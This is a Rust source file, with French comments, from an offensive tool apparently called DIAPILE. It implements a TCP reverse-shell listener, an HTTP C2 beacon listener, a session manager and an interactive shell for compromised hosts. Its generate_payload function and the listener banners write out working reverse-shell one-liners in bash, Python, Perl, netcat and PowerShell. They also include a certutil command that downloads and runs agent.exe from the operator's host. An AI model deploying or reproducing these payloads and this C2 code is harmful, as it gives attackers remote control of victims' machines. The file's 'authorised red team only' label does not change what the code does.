//! DIAPILE — Shell interactif & Reverse Shell Listener
//!
//! Gestion des sessions shell obtenues après exploitation :
//! - Listener TCP/HTTP reverse shell
//! - Sessions multiples avec PTY simulé
//! - Interface interact pour commandes interactives
//!
//! ⚠️ RÉSERVÉ AUX OPÉRATIONS RED TEAM AUTORISÉES.
#![allow(dead_code)]

use chrono::Utc;
use lazy_static::lazy_static;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::Arc;
use tokio::io::{AsyncBufReadExt, AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};
use tokio::sync::{Mutex, RwLock};
use tokio::time::{timeout, Duration};

// ─────────────────────────────────────────────────────────────────────────────
// Types
// ─────────────────────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum SessionStatus {
    Active,
    Sleeping,
    Dead,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShellSession {
    pub id: usize,
    pub remote_ip: String,
    pub remote_port: u16,
    pub hostname: Option<String>,
    pub username: Option<String>,
    pub os: Option<String>,
    pub shell_type: ShellType,
    pub status: SessionStatus,
    pub established: String,
    pub last_seen: String,
    pub command_log: Vec<CommandEntry>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CommandEntry {
    pub timestamp: String,
    pub command: String,
    pub output: String,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum ShellType {
    ReverseTcp,
    ReverseHttp,
    BindTcp,
}

impl std::fmt::Display for ShellType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ShellType::ReverseTcp => write!(f, "reverse/tcp"),
            ShellType::ReverseHttp => write!(f, "reverse/http"),
            ShellType::BindTcp => write!(f, "bind/tcp"),
        }
    }
}

impl std::fmt::Display for SessionStatus {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            SessionStatus::Active => write!(f, "ACTIVE"),
            SessionStatus::Sleeping => write!(f, "SLEEPING"),
            SessionStatus::Dead => write!(f, "DEAD"),
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Session Manager
// ─────────────────────────────────────────────────────────────────────────────

lazy_static! {
    /// Singleton global SessionManager — partagé entre listener, exploit_engine,
    /// post-exploit, interact, session-cmd. Évite les instances locales déconnectées.
    pub static ref GLOBAL_SESSIONS: Arc<SessionManager> = SessionManager::new();
}

pub struct SessionManager {
    sessions: RwLock<HashMap<usize, ShellSession>>,
    streams: Mutex<HashMap<usize, TcpStream>>,
    next_id: Mutex<usize>,
}

impl SessionManager {
    pub fn new() -> Arc<Self> {
        Arc::new(Self {
            sessions: RwLock::new(HashMap::new()),
            streams: Mutex::new(HashMap::new()),
            next_id: Mutex::new(1),
        })
    }

    async fn next_id(&self) -> usize {
        let mut id = self.next_id.lock().await;
        let cur = *id;
        *id += 1;
        cur
    }

    pub async fn list(&self) -> Vec<ShellSession> {
        let sessions = self.sessions.read().await;
        let mut list: Vec<_> = sessions.values().cloned().collect();
        list.sort_by_key(|s| s.id);
        list
    }

    pub async fn get(&self, id: usize) -> Option<ShellSession> {
        self.sessions.read().await.get(&id).cloned()
    }

    pub async fn kill(&self, id: usize) {
        self.sessions.write().await.remove(&id);
        self.streams.lock().await.remove(&id);
    }

    /// Enregistre un stream TCP ouvert (ex: bind shell, backdoor)
    /// comme session interactive — retourne l'ID de session nouvellement alloué.
    pub async fn register_external_session(
        &self,
        stream: TcpStream,
        remote_ip: String,
        remote_port: u16,
        shell_type: ShellType,
        username: Option<String>,
        os: Option<String>,
        hostname: Option<String>,
    ) -> usize {
        let id = self.next_id().await;
        let now = Utc::now().to_rfc3339();
        let session = ShellSession {
            id,
            remote_ip: remote_ip.clone(),
            remote_port,
            hostname: hostname.clone(),
            username: username.clone(),
            os: os.clone(),
            shell_type: shell_type.clone(),
            status: SessionStatus::Active,
            established: now.clone(),
            last_seen: now,
            command_log: Vec::new(),
        };
        println!(
            "  \x1b[32m[SESSION {}]\x1b[0m {}@{}  TYPE={}  OS={:?}",
            id,
            username.as_deref().unwrap_or("?"),
            remote_ip,
            shell_type,
            os.as_deref().unwrap_or("?"),
        );
        self.streams.lock().await.insert(id, stream);
        self.sessions.write().await.insert(id, session);
        id
    }

    /// Envoie une commande à une session et retourne la sortie
    pub async fn exec(&self, id: usize, cmd: &str, timeout_sec: u64) -> Result<String, String> {
        let cmd_with_newline = format!("{}\n", cmd);

        // Write command
        {
            let mut streams = self.streams.lock().await;
            let stream = streams.get_mut(&id).ok_or("Session not found")?;
            timeout(
                Duration::from_secs(5),
                stream.write_all(cmd_with_newline.as_bytes()),
            )
            .await
            .map_err(|_| "Write timeout".to_string())?
            .map_err(|e| e.to_string())?;
        }

        // Read response
        let output = {
            let mut streams = self.streams.lock().await;
            let stream = streams.get_mut(&id).ok_or("Session not found")?;
            let mut buf = vec![0u8; 65536];
            let n = timeout(Duration::from_secs(timeout_sec), stream.read(&mut buf))
                .await
                .map_err(|_| "Read timeout — no output (command may still be running)".to_string())?
                .map_err(|e| e.to_string())?;
            String::from_utf8_lossy(&buf[..n]).to_string()
        };

        // Log the command
        let entry = CommandEntry {
            timestamp: Utc::now().to_rfc3339(),
            command: cmd.to_string(),
            output: output.clone(),
        };
        let mut sessions = self.sessions.write().await;
        if let Some(session) = sessions.get_mut(&id) {
            session.command_log.push(entry);
            session.last_seen = Utc::now().to_rfc3339();
        }

        Ok(output)
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Reverse Shell Listener (TCP)
// ─────────────────────────────────────────────────────────────────────────────

/// Lance un listener TCP et attend les connexions reverse shell entrantes.
/// Chaque connexion entrante devient une session gérée.
pub async fn start_tcp_listener(
    bind_addr: &str,
    bind_port: u16,
    manager: Arc<SessionManager>,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let addr = format!("{}:{}", bind_addr, bind_port);
    let listener = TcpListener::bind(&addr).await?;

    println!(
        "\n  \x1b[38;5;196m[LISTENER]\x1b[0m TCP reverse shell en attente sur \x1b[33m{}\x1b[0m",
        addr
    );
    println!(
        "  \x1b[90mPayload Linux   : bash -i >& /dev/tcp/{}/{} 0>&1\x1b[0m",
        bind_addr, bind_port
    );
    println!("  \x1b[90mPayload Windows : powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{}',{})...\"\x1b[0m\n", bind_addr, bind_port);

    loop {
        let (stream, peer) = listener.accept().await?;
        let remote_ip = peer.ip().to_string();
        let remote_port = peer.port();

        println!(
            "  \x1b[32m[+]\x1b[0m Connexion entrante depuis \x1b[33m{}:{}\x1b[0m",
            remote_ip, remote_port
        );

        let mgr = manager.clone();
        tokio::spawn(async move {
            handle_new_session(stream, remote_ip, remote_port, mgr).await;
        });
    }
}

/// Lance un listener HTTP qui accepte les connexions reverse shell via HTTP polling.
/// Le beacon envoie des requêtes POST périodiques et reçoit des commandes en réponse.
pub async fn start_http_listener(
    bind_addr: &str,
    bind_port: u16,
    manager: Arc<SessionManager>,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    use tokio::net::TcpListener;

    let addr = format!("{}:{}", bind_addr, bind_port);
    let listener = TcpListener::bind(&addr).await?;

    println!(
        "\n  \x1b[38;5;196m[LISTENER]\x1b[0m HTTP C2 listener sur \x1b[33m{}\x1b[0m",
        addr
    );

    loop {
        let (stream, peer) = listener.accept().await?;
        let remote_ip = peer.ip().to_string();
        let remote_port = peer.port();
        let mgr = manager.clone();

        tokio::spawn(async move {
            handle_http_beacon(stream, remote_ip, remote_port, mgr).await;
        });
    }
}

async fn handle_new_session(
    mut stream: TcpStream,
    remote_ip: String,
    remote_port: u16,
    manager: Arc<SessionManager>,
) {
    // Read initial banner / prompt to fingerprint the session
    let mut banner_buf = vec![0u8; 4096];
    let banner = match timeout(Duration::from_secs(3), stream.read(&mut banner_buf)).await {
        Ok(Ok(n)) if n > 0 => String::from_utf8_lossy(&banner_buf[..n]).to_string(),
        _ => String::new(),
    };

    // Fingerprint OS from banner
    let (os, username, hostname) = fingerprint_session(&banner);

    let id = manager.next_id().await;
    let now = Utc::now().to_rfc3339();

    let session = ShellSession {
        id,
        remote_ip: remote_ip.clone(),
        remote_port,
        hostname: hostname.clone(),
        username: username.clone(),
        os: os.clone(),
        shell_type: ShellType::ReverseTcp,
        status: SessionStatus::Active,
        established: now.clone(),
        last_seen: now,
        command_log: Vec::new(),
    };

    println!(
        "  \x1b[32m[SESSION {}]\x1b[0m {}@{}  OS={:?}  hostname={:?}",
        id,
        username.as_deref().unwrap_or("?"),
        remote_ip,
        os.as_deref().unwrap_or("?"),
        hostname.as_deref().unwrap_or("?"),
    );

    manager.streams.lock().await.insert(id, stream);
    manager.sessions.write().await.insert(id, session);
}

async fn handle_http_beacon(
    mut stream: TcpStream,
    remote_ip: String,
    remote_port: u16,
    manager: Arc<SessionManager>,
) {
    let mut buf = vec![0u8; 8192];
    let n = match timeout(Duration::from_secs(5), stream.read(&mut buf)).await {
        Ok(Ok(n)) => n,
        _ => return,
    };

    let request = String::from_utf8_lossy(&buf[..n]).to_string();

    // Extract beacon data from HTTP POST body
    if !request.contains("POST") {
        return;
    }

    let id = manager.next_id().await;
    let now = Utc::now().to_rfc3339();

    let session = ShellSession {
        id,
        remote_ip: remote_ip.clone(),
        remote_port,
        hostname: None,
        username: None,
        os: None,
        shell_type: ShellType::ReverseHttp,
        status: SessionStatus::Active,
        established: now.clone(),
        last_seen: now,
        command_log: Vec::new(),
    };

    manager.sessions.write().await.insert(id, session);

    // Send HTTP 200 OK response
    let response = "HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n";
    let _ = stream.write_all(response.as_bytes()).await;

    println!(
        "  \x1b[32m[HTTP BEACON {}]\x1b[0m Check-in depuis {}",
        id, remote_ip
    );
}

fn fingerprint_session(banner: &str) -> (Option<String>, Option<String>, Option<String>) {
    let b = banner.to_lowercase();
    let os = if b.contains("linux")
        || b.contains("ubuntu")
        || b.contains("debian")
        || b.contains("kali")
    {
        Some("Linux".into())
    } else if b.contains("windows") || b.contains("microsoft") || b.contains("ps c:\\") {
        Some("Windows".into())
    } else if b.contains("darwin") || b.contains("macos") {
        Some("macOS".into())
    } else {
        None
    };

    // Try to extract username from prompt patterns like "user@host:~$" or "PS C:\Users\user>"
    let username = extract_username(banner);
    let hostname = extract_hostname(banner);

    (os, username, hostname)
}

fn extract_username(banner: &str) -> Option<String> {
    // bash: user@hostname
    if let Some(at_pos) = banner.find('@') {
        let start = banner[..at_pos]
            .rfind(|c: char| c == '\n' || c == '\r' || c == ' ')
            .map(|p| p + 1)
            .unwrap_or(0);
        let user = banner[start..at_pos].trim().to_string();
        if !user.is_empty() && user.len() < 32 {
            return Some(user);
        }
    }
    None
}

fn extract_hostname(banner: &str) -> Option<String> {
    if let Some(at_pos) = banner.find('@') {
        let rest = &banner[at_pos + 1..];
        let end = rest
            .find(|c: char| c == ':' || c == ' ' || c == '$' || c == '#')
            .unwrap_or(rest.len().min(32));
        let host = rest[..end].trim().to_string();
        if !host.is_empty() && host.len() < 64 {
            return Some(host);
        }
    }
    None
}

// ─────────────────────────────────────────────────────────────────────────────
// Interactive Shell Interface
// ─────────────────────────────────────────────────────────────────────────────

/// Mode interactif : envoie/reçoit des commandes en temps réel sur une session
pub async fn interactive_shell(
    id: usize,
    manager: Arc<SessionManager>,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let session = manager
        .get(id)
        .await
        .ok_or(format!("Session {} not found", id))?;

    println!(
        "\n\x1b[38;5;196m╔══ SESSION {} ══════════════════════════════════╗\x1b[0m",
        id
    );
    println!(
        "\x1b[38;5;196m║\x1b[0m  \x1b[33m{}@{}\x1b[0m  OS={}  Type={}",
        session.username.as_deref().unwrap_or("?"),
        session.remote_ip,
        session.os.as_deref().unwrap_or("?"),
        session.shell_type,
    );
    println!("\x1b[38;5;196m║\x1b[0m  \x1b[90mTapez 'background' pour mettre en arrière-plan, 'exit' pour fermer\x1b[0m");
    println!("\x1b[38;5;196m╚════════════════════════════════════════════════╝\x1b[0m\n");

    let stdin = tokio::io::stdin();
    let mut reader = tokio::io::BufReader::new(stdin).lines();

    loop {
        // Prompt
        print!("\x1b[38;5;196mDIAPILE[{}]\x1b[0m> ", id);
        use std::io::Write;
        std::io::stdout().flush()?;

        let line = match reader.next_line().await? {
            Some(l) => l.trim().to_string(),
            None => break,
        };

        if line.is_empty() {
            continue;
        }
        if line == "background" {
            println!("  Session {} mise en arrière-plan", id);
            break;
        }
        if line == "exit" {
            manager.kill(id).await;
            break;
        }
        if line == "help" {
            println!("  Commandes spéciales: background, exit, sessions, upload <src> <dst>, download <path>");
            continue;
        }

        match manager.exec(id, &line, 10).await {
            Ok(out) => print!("{}", out),
            Err(e) => println!("\x1b[31m[!] {}\x1b[0m", e),
        }
    }

    Ok(())
}

/// Génère un payload reverse shell pour la cible
pub fn generate_payload(lhost: &str, lport: u16, shell_type: &str, os: &str) -> String {
    match (os.to_lowercase().as_str(), shell_type.to_lowercase().as_str()) {
        ("linux", "bash") => format!(
            "bash -i >& /dev/tcp/{}/{} 0>&1",
            lhost, lport
        ),
        ("linux", "python") => format!(
            "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{}\",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            lhost, lport
        ),
        ("linux", "perl") => format!(
            "perl -e 'use Socket;$i=\"{}\";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
            lhost, lport
        ),
        ("linux", "netcat") | ("linux", "nc") => format!(
            "nc -e /bin/bash {} {}",
            lhost, lport
        ),
        ("windows", "powershell") | ("windows", "ps") => format!(
            "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{}',{});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r+='PS '+(pwd).Path+'> ';$sb=(New-Object Text.ASCIIEncoding).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()\"",
            lhost, lport
        ),
        ("windows", "cmd") => format!(
            "cmd.exe /c \"certutil -urlcache -split -f http://{}:{}/agent.exe %TEMP%\\agent.exe && %TEMP%\\agent.exe\"",
            lhost, lport
        ),
        _ => format!("bash -i >& /dev/tcp/{}/{} 0>&1", lhost, lport),
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// CLI display
// ─────────────────────────────────────────────────────────────────────────────

pub fn print_sessions(sessions: &[ShellSession]) {
    if sessions.is_empty() {
        println!("  \x1b[90mAucune session active.\x1b[0m");
        return;
    }
    println!(
        "\n  \x1b[36m{:<4} {:<16} {:<10} {:<12} {:<12} {:<14} {}\x1b[0m",
        "ID", "REMOTE IP", "STATUS", "USERNAME", "OS", "TYPE", "DEPUIS"
    );
    println!("  {}", "─".repeat(80));
    for s in sessions {
        let status_color = match s.status {
            SessionStatus::Active => "\x1b[32m",
            SessionStatus::Sleeping => "\x1b[33m",
            SessionStatus::Dead => "\x1b[31m",
        };
        println!(
            "  {:<4} {:<16} {}{:<10}\x1b[0m {:<12} {:<12} {:<14} {}",
            s.id,
            s.remote_ip,
            status_color,
            format!("{:?}", s.status),
            s.username.as_deref().unwrap_or("?"),
            s.os.as_deref().unwrap_or("?"),
            s.shell_type.to_string(),
            &s.established[..19],
        );
    }
    println!();
}
